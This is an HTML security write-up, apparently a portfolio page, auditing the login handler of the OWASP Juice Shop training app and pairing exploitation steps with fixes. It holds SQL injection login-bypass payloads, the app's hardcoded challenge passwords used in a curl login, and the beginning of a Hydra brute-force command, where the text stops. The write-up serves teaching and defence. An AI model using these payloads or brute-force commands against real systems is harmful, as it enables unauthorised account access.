@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>OWASP Juice Shop — Login Security Report | Marco Abreu</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a192f;
+            --bg-secondary: #112240;
+            --bg-tertiary: #1d3461;
+            --accent-color: #64ffda;
+            --accent-dim: rgba(100, 255, 218, 0.1);
+            --accent-dim2: rgba(100, 255, 218, 0.05);
+            --text-primary: #ccd6f6;
+            --text-secondary: #8892b0;
+            --text-muted: #495670;
+            --red: #ff6b6b;
+            --green: #64ffda;
+            --yellow: #ffd86f;
+            --blue: #57cbff;
+            --orange: #ffb86c;
+            --font-mono: 'Fira Code', monospace;
+            --font-body: 'Inter', sans-serif;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            font-family: var(--font-body);
+            font-size: 16px;
+            line-height: 1.75;
+        }
+
+        /* ── NAVBAR ── */
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(10, 25, 47, 0.92);
+            backdrop-filter: blur(10px);
+            padding: 18px 60px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+            border-bottom: 1px solid var(--text-muted);
+        }
+
+        .logo {
+            font-family: var(--font-mono);
+            font-size: 1.1rem;
+            color: var(--accent-color);
+            font-weight: 600;
+        }
+
+        .nav-links { list-style: none; display: flex; gap: 30px; }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover { color: var(--accent-color); }
+
+        /* ── HERO ── */
+        .hero {
+            padding: 160px 60px 80px;
+            max-width: 960px;
+            margin: 0 auto;
+        }
+
+        .hero-label {
+            font-family: var(--font-mono);
+            color: var(--accent-color);
+            font-size: 0.9rem;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .hero-label::before {
+            content: '';
+            display: block;
+            width: 40px;
+            height: 1px;
+            background: var(--accent-color);
+        }
+
+        .hero h1 {
+            font-size: clamp(2rem, 5vw, 3.2rem);
+            font-weight: 600;
+            color: #e6f1ff;
+            line-height: 1.2;
+            margin-bottom: 20px;
+        }
+
+        .hero-subtitle {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            max-width: 660px;
+            margin-bottom: 32px;
+        }
+
+        .tag-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 40px;
+        }
+
+        .tag {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            color: var(--accent-color);
+            background: var(--accent-dim);
+            border: 1px solid rgba(100,255,218,0.2);
+            padding: 4px 12px;
+            border-radius: 3px;
+        }
+
+        .tag.critical { color: var(--red); background: rgba(255,107,107,0.1); border-color: rgba(255,107,107,0.25); }
+        .tag.high     { color: var(--orange); background: rgba(255,184,108,0.1); border-color: rgba(255,184,108,0.25); }
+        .tag.medium   { color: var(--yellow); background: rgba(255,216,111,0.1); border-color: rgba(255,216,111,0.25); }
+
+        .hero-divider {
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(to right, var(--accent-color), transparent);
+            opacity: 0.3;
+        }
+
+        /* ── SECTION ── */
+        .section { padding: 60px 60px; }
+
+        .container { max-width: 960px; margin: 0 auto; }
+
+        h2.section-title {
+            font-family: var(--font-mono);
+            font-size: 1.6rem;
+            color: #e6f1ff;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        h2.section-title::after {
+            content: '';
+            display: block;
+            height: 1px;
+            flex: 1;
+            background: var(--text-muted);
+        }
+
+        h3 {
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: var(--accent-color);
+            margin-top: 50px;
+            margin-bottom: 14px;
+            font-family: var(--font-mono);
+        }
+
+        p {
+            color: var(--text-secondary);
+            margin-bottom: 16px;
+            max-width: 780px;
+        }
+
+        /* ── VULNERABILITY ENTRY ── */
+        .vuln-entry {
+            background: var(--bg-secondary);
+            border: 1px solid var(--text-muted);
+            border-radius: 8px;
+            margin: 40px 0;
+            overflow: hidden;
+        }
+
+        .vuln-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 20px 28px;
+            border-bottom: 1px solid var(--text-muted);
+        }
+
+        .vuln-header.critical { border-left: 4px solid var(--red); }
+        .vuln-header.high     { border-left: 4px solid var(--orange); }
+        .vuln-header.medium   { border-left: 4px solid var(--yellow); }
+
+        .vuln-index {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            min-width: 30px;
+        }
+
+        .vuln-header-text { flex: 1; }
+
+        .vuln-title {
+            font-family: var(--font-mono);
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: #e6f1ff;
+            margin: 0 0 2px 0;
+        }
+
+        .vuln-subtitle {
+            font-size: 0.82rem;
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+        }
+
+        .severity-badge {
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            padding: 4px 12px;
+            border-radius: 3px;
+        }
+
+        .severity-badge.critical { background: rgba(255,107,107,0.15); color: var(--red); border: 1px solid rgba(255,107,107,0.3); }
+        .severity-badge.high     { background: rgba(255,184,108,0.15); color: var(--orange); border: 1px solid rgba(255,184,108,0.3); }
+        .severity-badge.medium   { background: rgba(255,216,111,0.15); color: var(--yellow); border: 1px solid rgba(255,216,111,0.3); }
+
+        .vuln-body { padding: 28px; }
+
+        .vuln-body p { max-width: 100%; }
+
+        /* ── TABS (before/after) ── */
+        .diff-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .diff-panel { overflow: hidden; border-radius: 6px; border: 1px solid var(--text-muted); }
+
+        .diff-panel-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .diff-panel-header.before { background: rgba(255,107,107,0.1); color: var(--red); border-bottom: 1px solid rgba(255,107,107,0.2); }
+        .diff-panel-header.after  { background: rgba(100,255,218,0.07); color: var(--green); border-bottom: 1px solid rgba(100,255,218,0.15); }
+
+        .diff-panel pre { border-radius: 0; border: none; margin: 0; }
+
+        /* ── CALLOUT BOXES ── */
+        .callout {
+            background: var(--bg-secondary);
+            border-left: 3px solid var(--accent-color);
+            padding: 18px 22px;
+            border-radius: 0 6px 6px 0;
+            margin: 24px 0;
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+        }
+
+        .callout.warn  { border-left-color: var(--yellow); }
+        .callout.danger { border-left-color: var(--red); }
+        .callout.info  { border-left-color: var(--blue); }
+
+        .callout .callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: 2px; }
+        .callout p { color: var(--text-primary); margin: 0; font-size: 0.9rem; max-width: 100%; }
+
+        /* ── CODE BLOCKS ── */
+        pre {
+            background: #0d1f38;
+            border: 1px solid var(--text-muted);
+            padding: 20px 22px;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin: 18px 0;
+            position: relative;
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            line-height: 1.7;
+        }
+
+        pre::before {
+            content: attr(data-label);
+            position: absolute;
+            top: 10px;
+            right: 14px;
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            letter-spacing: 0.05em;
+        }
+
+        code.command { color: var(--accent-color); font-weight: 600; }
+        code.input   { color: var(--yellow); }
+        code.output  { color: var(--blue); }
+        code.pass    { color: var(--green); }
+        code.fail    { color: var(--red); }
+        code.comment { color: var(--text-muted); font-style: italic; }
+        code.vuln    { color: var(--red); font-weight: 600; }
+        code.fix     { color: var(--green); font-weight: 600; }
+        code.neutral { color: var(--text-primary); }
+        code.hilite  { background: rgba(255,107,107,0.12); display: block; margin: 0 -22px; padding: 0 22px; border-left: 3px solid var(--red); }
+        code.hilite-fix { background: rgba(100,255,218,0.07); display: block; margin: 0 -22px; padding: 0 22px; border-left: 3px solid var(--green); }
+
+        /* ── SCREENSHOT PLACEHOLDER ── */
+        .screenshot {
+            background: var(--bg-tertiary);
+            border: 1px dashed rgba(100,255,218,0.25);
+            border-radius: 6px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .screenshot-label {
+            background: rgba(100,255,218,0.06);
+            border-bottom: 1px dashed rgba(100,255,218,0.2);
+            padding: 8px 16px;
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            color: var(--accent-color);
+            letter-spacing: 0.05em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .screenshot img {
+            display: block;
+            width: 100%;
+            height: auto;
+        }
+
+        /* ── STEP LIST ── */
+        .step-list {
+            list-style: none;
+            padding: 0;
+            counter-reset: steps;
+            margin: 16px 0;
+        }
+
+        .step-list li {
+            counter-increment: steps;
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--text-muted);
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+
+        .step-list li:last-child { border-bottom: none; }
+
+        .step-list li::before {
+            content: counter(steps, decimal-leading-zero);
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--accent-color);
+            background: var(--accent-dim);
+            min-width: 32px;
+            height: 22px;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        /* ── CHECK LIST ── */
+        .check-list {
+            list-style: none;
+            padding: 0;
+            margin: 14px 0;
+        }
+
+        .check-list li {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 7px 0;
+            border-bottom: 1px solid var(--text-muted);
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+
+        .check-list li:last-child { border-bottom: none; }
+
+        .check-list li .icon {
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            font-weight: 700;
+            flex-shrink: 0;
+            margin-top: 2px;
+            min-width: 22px;
+        }
+
+        .check-list li .icon.pass { color: var(--green); }
+        .check-list li .icon.fail { color: var(--red); }
+
+        /* ── SUMMARY TABLE ── */
+        .vuln-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 0.88rem;
+        }
+
+        .vuln-table th {
+            background: var(--bg-tertiary);
+            color: var(--accent-color);
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            padding: 12px 16px;
+            text-align: left;
+        }
+
+        .vuln-table td {
+            padding: 11px 16px;
+            border-bottom: 1px solid var(--text-muted);
+            color: var(--text-secondary);
+            vertical-align: top;
+        }
+
+        .vuln-table tr:last-child td { border-bottom: none; }
+        .vuln-table tr:nth-child(even) td { background: var(--accent-dim2); }
+
+        .vuln-table td.vuln-name {
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            color: #e6f1ff;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        /* ── FEATURES LIST ── */
+        .features-list { list-style: none; padding-left: 0; }
+
+        .features-list li {
+            color: var(--text-secondary);
+            padding: 8px 0;
+            padding-left: 20px;
+            position: relative;
+            border-bottom: 1px solid var(--text-muted);
+            font-size: 0.95rem;
+        }
+
+        .features-list li:last-child { border-bottom: none; }
+
+        .features-list li::before {
+            content: "▹";
+            color: var(--accent-color);
+            position: absolute;
+            left: 0;
+        }
+
+        .features-list strong { color: var(--text-primary); }
+
+        /* ── FOOTER ── */
+        footer {
+            text-align: center;
+            padding: 40px 60px;
+            border-top: 1px solid var(--text-muted);
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        /* ── RESPONSIVE ── */
+        @media (max-width: 700px) {
+            .navbar { padding: 16px 24px; }
+            .hero, .section { padding-left: 24px; padding-right: 24px; }
+            .diff-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <a href="../index.html" style="text-decoration:none;">
+        <div class="logo">&lt;Marco Abreu /&gt;</div>
+    </a>
+    <ul class="nav-links">
+        <li><a href="../index.html#projects">← Back to Projects</a></li>
+    </ul>
+</nav>
+
+<!-- ── HERO ── -->
+<div class="hero">
+    <p class="hero-label">Security Research — Write-Up</p>
+    <h1>OWASP Juice Shop<br>Login Security Audit</h1>
+    <p class="hero-subtitle">
+        A full manual penetration test of the Juice Shop authentication endpoint —
+        identifying, exploiting, and remediating six real-world vulnerabilities
+        in the <code style="font-family:var(--font-mono);color:var(--accent-color);font-size:0.9em;">login.ts</code> handler.
+    </p>
+    <div class="tag-row">
+        <span class="tag critical">1 Critical</span>
+        <span class="tag high">3 High</span>
+        <span class="tag medium">2 Medium</span>
+        <span class="tag">Node.js / TypeScript</span>
+        <span class="tag">Sequelize ORM</span>
+        <span class="tag">JWT</span>
+        <span class="tag">OWASP Top 10</span>
+    </div>
+    <div class="hero-divider"></div>
+</div>
+
+<section class="section">
+<div class="container">
+
+    <!-- ── INTRODUCTION ── -->
+    <h2 class="section-title">Introduction</h2>
+    <p>
+        OWASP Juice Shop is an intentionally vulnerable web application designed for security training.
+        This write-up focuses exclusively on the login handler (<code style="font-family:var(--font-mono);color:var(--yellow);">routes/login.ts</code>),
+        which contains six distinct security vulnerabilities ranging from a critical SQL injection to authentication
+        design flaws that compound one another in real attack chains.
+    </p>
+    <p>
+        Each vulnerability below is documented with the exact vulnerable source code, a tested exploitation
+        method, the underlying attack class, and a corrected implementation.
+    </p>
+
+    <div class="callout danger">
+        <span class="callout-icon">⚠️</span>
+        <p>All testing was performed against a local Juice Shop instance. Never test against systems you do not own or have explicit written permission to test.</p>
+    </div>
+
+    <!-- ── TARGET FILE ── -->
+    <h3>🎯 Target File</h3>
+    <p>The full source of the audited file, for reference:</p>
+    <pre data-label="routes/login.ts">
+<code class="neutral">import { type Request, type Response, type NextFunction } from 'express'
+import config from 'config'
+import * as challengeUtils from '../lib/challengeUtils'
+import { challenges, users } from '../data/datacache'
+import { BasketModel } from '../models/basket'
+import * as security from '../lib/insecurity'
+import { UserModel } from '../models/user'
+import * as models from '../models/index'
+import { type User } from '../data/types'
+import * as utils from '../lib/utils'
+
+export function login () {
+  function afterLogin (user: { data: User, bid: number }, res: Response, next: NextFunction) {
+    verifyPostLoginChallenges(user)
+    BasketModel.findOrCreate({ where: { UserId: user.data.id } })
+      .then(([basket]: [BasketModel, boolean]) => {
+        const token = security.authorize(user)
+        user.bid = basket.id
+        security.authenticatedUsers.put(token, user)
+        res.json({ authentication: { token, bid: basket.id, umail: user.data.email } })
+      }).catch((error: Error) => { next(error) })
+  }
+
+  return (req: Request, res: Response, next: NextFunction) => {
+    verifyPreLoginChallenges(req)
+</code><code class="hilite">    models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
+</code><code class="neutral">      .then((authenticatedUser) => {
+        const user = utils.queryResultToJson(authenticatedUser)
+        if (user.data?.id && user.data.totpSecret !== '') {
+          res.status(401).json({ status: 'totp_token_required', data: { tmpToken: security.authorize({ userId: user.data.id, type: 'password_valid_needs_second_factor_token' }) } })
+        } else if (user.data?.id) {
+          afterLogin(user, res, next)
+        } else {
+          res.status(401).send(res.__('Invalid email or password.'))
+        }
+      }).catch((error: Error) => { next(error) })
+  }
+
+  function verifyPreLoginChallenges (req: Request) {
+</code><code class="hilite">    challengeUtils.solveIf(challenges.loginSupportChallenge, () => { return req.body.email === 'support@' + config.get('application.domain') && req.body.password === 'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P' })
+    challengeUtils.solveIf(challenges.loginRapperChallenge,  () => { return req.body.email === 'mc.safesearch@' + config.get('application.domain') && req.body.password === 'Mr. N00dles' })
+    challengeUtils.solveIf(challenges.loginAmyChallenge,     () => { return req.body.email === 'amy@' + config.get('application.domain') && req.body.password === 'K1f.....................' })
+    challengeUtils.solveIf(challenges.oauthUserPasswordChallenge, () => { return req.body.email === 'bjoern.kimminich@gmail.com' && req.body.password === 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' })
+    challengeUtils.solveIf(challenges.exposedCredentialsChallenge, () => { return req.body.email === 'testing@' + config.get('application.domain') && req.body.password === 'IamUsedForTesting' })
+</code><code class="neutral">  }
+
+  function verifyPostLoginChallenges (user: { data: User }) {
+    challengeUtils.solveIf(challenges.loginAdminChallenge, () => { return user.data.id === users.admin.id })
+    ...
+  }
+}</code></pre>
+
+    <!-- ── VULNERABILITY SUMMARY TABLE ── -->
+    <h3>📋 Findings Summary</h3>
+    <table class="vuln-table">
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>Vulnerability</th>
+                <th>Severity</th>
+                <th>OWASP Category</th>
+                <th>Location</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td style="font-family:var(--font-mono);color:var(--text-muted);">01</td>
+                <td class="vuln-name">SQL Injection</td>
+                <td><span class="severity-badge critical">Critical</span></td>
+                <td>A03 Injection</td>
+                <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--yellow);">sequelize.query()</td>
+            </tr>
+            <tr>
+                <td style="font-family:var(--font-mono);color:var(--text-muted);">02</td>
+                <td class="vuln-name">Hardcoded Credentials</td>
+                <td><span class="severity-badge high">High</span></td>
+                <td>A02 Cryptographic Failures</td>
+                <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--yellow);">verifyPreLoginChallenges()</td>
+            </tr>
+            <tr>
+                <td style="font-family:var(--font-mono);color:var(--text-muted);">03</td>
+                <td class="vuln-name">No Rate Limiting</td>
+                <td><span class="severity-badge high">High</span></td>
+                <td>A07 Identification &amp; Auth. Failures</td>
+                <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--yellow);">login endpoint (global)</td>
+            </tr>
+            <tr>
+                <td style="font-family:var(--font-mono);color:var(--text-muted);">04</td>
+                <td class="vuln-name">Weak Password Hashing (MD5)</td>
+                <td><span class="severity-badge high">High</span></td>
+                <td>A02 Cryptographic Failures</td>
+                <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--yellow);">security.hash()</td>
+            </tr>
+            <tr>
+                <td style="font-family:var(--font-mono);color:var(--text-muted);">05</td>
+                <td class="vuln-name">Username Enumeration</td>
+                <td><span class="severity-badge medium">Medium</span></td>
+                <td>A07 Identification &amp; Auth. Failures</td>
+                <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--yellow);">response logic / timing</td>
+            </tr>
+            <tr>
+                <td style="font-family:var(--font-mono);color:var(--text-muted);">06</td>
+                <td class="vuln-name">JWT Never Invalidated</td>
+                <td><span class="severity-badge medium">Medium</span></td>
+                <td>A07 Identification &amp; Auth. Failures</td>
+                <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--yellow);">authenticatedUsers.put()</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <!-- VULN 01 — SQL INJECTION -->
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <div class="vuln-entry">
+        <div class="vuln-header critical">
+            <span class="vuln-index">01</span>
+            <div class="vuln-header-text">
+                <p class="vuln-title">SQL Injection</p>
+                <p class="vuln-subtitle">Unsanitised user input interpolated into a raw SQL query</p>
+            </div>
+            <span class="severity-badge critical">Critical</span>
+        </div>
+        <div class="vuln-body">
+
+            <p>The login handler builds its SQL query by directly concatenating <code style="font-family:var(--font-mono);color:var(--yellow);">req.body.email</code> and the hashed password into a template literal. An attacker controls the string that gets passed to the database engine, allowing them to manipulate the query logic entirely — bypassing authentication without knowing any password.</p>
+
+            <!-- VULNERABLE CODE -->
+            <h3 style="margin-top:24px;">Vulnerable Code</h3>
+            <pre data-label="routes/login.ts — line ~34">
+<code class="comment">// req.body.email is user-controlled input — never safe to embed directly</code>
+<code class="hilite">models.sequelize.query(
+  `SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
+  { model: UserModel, plain: true }
+)</code></pre>
+
+            <!-- HOW TO TEST -->
+            <h3 style="margin-top:28px;">How to Exploit</h3>
+            <p>Open Burp Suite, intercept the POST request to <code style="font-family:var(--font-mono);color:var(--yellow);">/rest/user/login</code>, and modify the email field. The injected payload terminates the string and comments out the password check entirely.</p>
+
+            <ol class="step-list">
+                <li>Open the Juice Shop login page and start Burp Suite's Intercept.</li>
+                <li>Enter any value in the email and password fields and click Login.</li>
+                <li>In Burp Intercept, modify the <code style="font-family:var(--font-mono);color:var(--yellow);">email</code> body parameter to the payload below.</li>
+                <li>Forward the request. The application logs you in as the admin user.</li>
+            </ol>
+
+            <pre data-label="Burp Suite — Request Body">
+<code class="comment"># Payload: terminates the email string, injects OR true, comments out password check</code>
+<code class="input">email=admin@juice-sh.op'--&amp;password=anything</code>
+
+<code class="comment"># Resulting SQL sent to the database:</code>
+<code class="fail">SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...' AND deletedAt IS NULL</code>
+<code class="comment"># Everything after -- is ignored by SQLite. Query becomes:</code>
+<code class="pass">SELECT * FROM Users WHERE email = 'admin@juice-sh.op'</code></pre>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — Burp Suite intercept showing the injected email payload</div>
+                <img src="images/sqli-burp-intercept.png" alt="sqli-burp-intercept.png" style="width:100%;display:block;">
+            </div>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — Juice Shop responding with a valid JWT token after the SQL injection</div>
+                <img src="images/sqli-response-token.png" alt="sqli-response-token.png" style="width:100%;display:block;">
+            </div>
+
+            <!-- ALTERNATIVE PAYLOAD -->
+            <p>An alternative payload using a boolean condition works even without knowing a valid email address:</p>
+            <pre data-label="Alternative payload — any account">
+<code class="input">email=' OR '1'='1'--&amp;password=anything</code>
+
+<code class="comment"># Resulting SQL:</code>
+<code class="fail">SELECT * FROM Users WHERE email = '' OR '1'='1'</code>
+<code class="comment"># Returns the first user in the database (typically the admin)</code></pre>
+
+            <!-- FIX -->
+            <h3 style="margin-top:28px;">How to Fix</h3>
+            <p>Replace the raw string query with Sequelize's parameterised <code style="font-family:var(--font-mono);color:var(--yellow);">findOne()</code>. The ORM handles all escaping automatically — user input is never concatenated into SQL.</p>
+
+            <div class="diff-grid">
+                <div class="diff-panel">
+                    <div class="diff-panel-header before">❌ Vulnerable</div>
+                    <pre>
+<code class="fail">models.sequelize.query(
+  `SELECT * FROM Users WHERE email = '${req.body.email || ''}'
+   AND password = '${security.hash(req.body.password || '')}'
+   AND deletedAt IS NULL`,
+  { model: UserModel, plain: true }
+)</code></pre>
+                </div>
+                <div class="diff-panel">
+                    <div class="diff-panel-header after">✅ Fixed</div>
+                    <pre>
+<code class="fix">UserModel.findOne({
+  where: {
+    email: req.body.email,
+    password: security.hash(
+      req.body.password || ''
+    ),
+    deletedAt: null
+  }
+})</code></pre>
+                </div>
+            </div>
+
+            <div class="callout info">
+                <span class="callout-icon">💡</span>
+                <p>Sequelize's <code style="font-family:var(--font-mono);">where</code> clause passes values as bound parameters to the underlying driver. User input is treated as data, never as SQL syntax.</p>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <!-- VULN 02 — HARDCODED CREDENTIALS -->
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <div class="vuln-entry">
+        <div class="vuln-header high">
+            <span class="vuln-index">02</span>
+            <div class="vuln-header-text">
+                <p class="vuln-title">Hardcoded Credentials in Source Code</p>
+                <p class="vuln-subtitle">Plaintext passwords committed to the repository</p>
+            </div>
+            <span class="severity-badge high">High</span>
+        </div>
+        <div class="vuln-body">
+
+            <p>The <code style="font-family:var(--font-mono);color:var(--yellow);">verifyPreLoginChallenges()</code> function contains multiple real user passwords written in plaintext directly in the source code. Anyone with access to the repository — including any contributor, contractor, or attacker who obtains the source — immediately has valid credentials for multiple accounts.</p>
+
+            <h3 style="margin-top:24px;">Vulnerable Code</h3>
+            <pre data-label="routes/login.ts — verifyPreLoginChallenges()">
+<code class="neutral">function verifyPreLoginChallenges (req: Request) {
+</code><code class="hilite">  challengeUtils.solveIf(challenges.loginSupportChallenge, () => {
+    return req.body.email    === 'support@juice-sh.op'
+        && req.body.password === 'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P'  // ❌ plaintext in source
+  })
+  challengeUtils.solveIf(challenges.loginRapperChallenge, () => {
+    return req.body.email    === 'mc.safesearch@juice-sh.op'
+        && req.body.password === 'Mr. N00dles'                        // ❌ plaintext in source
+  })
+  challengeUtils.solveIf(challenges.loginAmyChallenge, () => {
+    return req.body.email    === 'amy@juice-sh.op'
+        && req.body.password === 'K1f.....................'             // ❌ plaintext in source
+  })
+  challengeUtils.solveIf(challenges.exposedCredentialsChallenge, () => {
+    return req.body.email    === 'testing@juice-sh.op'
+        && req.body.password === 'IamUsedForTesting'                  // ❌ plaintext in source
+  })
+</code><code class="neutral">}</code></pre>
+
+            <h3 style="margin-top:28px;">How to Exploit</h3>
+            <p>No tooling required. Clone or browse the repository and use the credentials directly against the login endpoint.</p>
+
+            <ol class="step-list">
+                <li>Navigate to the public GitHub repository or obtain the source through any means (leaked archive, insider access, decompiled bundle).</li>
+                <li>Search the source for the keyword <code style="font-family:var(--font-mono);color:var(--yellow);">solveIf</code> or simply grep for password strings.</li>
+                <li>Use the extracted credentials directly in the login form or via curl.</li>
+            </ol>
+
+            <pre data-label="Exploitation — curl">
+<code class="command">curl -s -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"support@juice-sh.op","password":"J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"}'</code>
+
+<code class="comment"># Response — valid token returned immediately</code>
+<code class="pass">{"authentication":{"token":"eyJhbGci...","bid":5,"umail":"support@juice-sh.op"}}</code></pre>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — grep output showing hardcoded passwords found in the source file</div>
+                <img src="images/hardcoded-grep-output.png" alt="hardcoded-grep-output.png" style="width:100%;display:block;">
+            </div>
+
+            <div class="screenshot">
+                <div class="screenshot-label">📸 Screenshot — successful login as support account using the hardcoded password</div>
+                <img src="images/hardcoded-login-success.png" alt="hardcoded-login-success.png" style="width:100%;display:block;">
+            </div>
+
+            <h3 style="margin-top:28px;">How to Fix</h3>
+            <p>Remove all plaintext credentials from source code. Load secrets exclusively from environment variables or a secrets manager at runtime. In production, these challenge verifications should be removed entirely.</p>
+
+            <div class="diff-grid">
+                <div class="diff-panel">
+                    <div class="diff-panel-header before">❌ Vulnerable</div>
+                    <pre>
+<code class="fail">challengeUtils.solveIf(
+  challenges.loginSupportChallenge,
+  () => {
+    return req.body.password ===
+      'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P'
+  }
+)</code></pre>
+                </div>
+                <div class="diff-panel">
+                    <div class="diff-panel-header after">✅ Fixed</div>
+                    <pre>
+<code class="fix">challengeUtils.solveIf(
+  challenges.loginSupportChallenge,
+  () => {
+    return req.body.password ===
+      process.env.SUPPORT_ACCOUNT_PASSWORD
+  }
+)
+// Loaded from .env / vault at runtime
+// Never committed to the repository</code></pre>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <!-- VULN 03 — NO RATE LIMITING -->
+    <!-- ════════════════════════════════════════════════════════════ -->
+    <div class="vuln-entry">
+        <div class="vuln-header high">
+            <span class="vuln-index">03</span>
+            <div class="vuln-header-text">
+                <p class="vuln-title">No Rate Limiting / Brute Force Protection</p>
+                <p class="vuln-subtitle">Login endpoint accepts unlimited requests with no throttling</p>
+            </div>
+            <span class="severity-badge high">High</span>
+        </div>
+        <div class="vuln-body">
+
+            <p>The login route has no request throttling, account lockout, or CAPTCHA mechanism. An attacker can send thousands of login attempts per second, making brute force and credential stuffing attacks trivially effective — especially given that the password hashing is weak (see Vulnerability 04).</p>
+
+            <h3 style="margin-top:24px;">Vulnerable Code</h3>
+            <pre data-label="routes/login.ts — no middleware present">
+<code class="neutral">// In app.ts / server setup — the route is registered with no rate limiting:</code>
+<code class="hilite">app.post('/rest/user/login', login())
+// ❌ No express-rate-limit middleware
+// ❌ No account lockout after N failures
+// ❌ No CAPTCHA or challenge after repeated failures</code></pre>
+
+            <h3 style="margin-top:28px;">How to Exploit</h3>
+            <p>Use <strong style="color:var(--text-primary);">Hydra</strong> or Burp Suite Intruder to run an automated password list attack against a known email address. With no rate limiting, the full <code style="font-family:var(--font-mono);color:var(--yellow);">rockyou.txt</code> wordlist can be tested in minutes.</p>
+
+            <ol class="step-list">
+                <li>Confirm a valid email address exists (e.g. from the SQLi above or the admin account <code style="font-family:var(--font-mono);color:var(--yellow);">admin@juice-sh.op</code>).</li>
+                <li>Prepare a password wordlist (e.g. <code style="font-family:var(--font-mono);color:var(--yellow);">rockyou.txt</code> or a targeted list).</li>
+                <li>Run Hydra against the REST login endpoint as shown below.</li>
+                <li>Observe that there is no lockout, delay, or error rate increase regardless of attempt count.</li>
+            </ol>
+
+            <pre data-label="Hydra — brute force command">
+<code class="command">hydra -l admin@juice-sh.op \
+      -P /usr/share/wordlists/rockyou.txt \
+      localhost \
+      http-post-form \
